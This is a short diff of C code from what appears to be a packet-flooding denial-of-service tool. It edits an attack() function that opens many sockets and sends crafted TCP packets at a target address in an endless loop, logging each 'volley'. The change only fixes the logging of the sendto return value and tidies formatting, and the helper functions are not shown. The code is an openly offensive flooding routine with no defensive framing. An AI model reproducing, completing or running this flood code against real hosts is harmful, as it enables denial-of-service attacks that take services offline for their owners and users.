@@ -35,28 +35,30 @@ void make_packet(struct tcp_packet *packet, struct sockaddr_in *addr)
 void attack(struct sockaddr_in *t_addr, int id)
 {
 	int sockets[CONNECTIONS];
-	int n, g=1, r;
+	int n, g=1, len;
     struct tcp_packet packet;
 
     memset(&packet, 0 ,sizeof(struct tcp_packet));
 
 	for(n=0; n!= CONNECTIONS; n++)
 		sockets[n]=0;
-	while(1) {
+	while(1) 
+    {
 		for(n=0; n != CONNECTIONS; n++)
         {
 			if(sockets[n] == 0)
 			    sockets[n] = make_socket();
 
             make_packet(&packet, t_addr);
-			if(sendto(sockets[n], &packet, sizeof(packet), 0, (struct sockaddr *)t_addr, sizeof(*t_addr)) < 0)
+            len=sendto(sockets[n], &packet, sizeof(packet), 0, (struct sockaddr *)t_addr, sizeof(*t_addr));
+			if(len < 0)
             {
                 perror("sendto");
                 close(sockets[n]);
 				sockets[n] = make_socket();
             }
             else
-			    printf("Socket[%i->%i] -> %i\n", n, sockets[n], r);
+			    printf("Socket[%i->%i] -> %i\n", n, sockets[n], len);
 			printf("[%i: Voly Sent]\n", id);
 		}
 		printf("[%i: Voly Sent]\n", id);
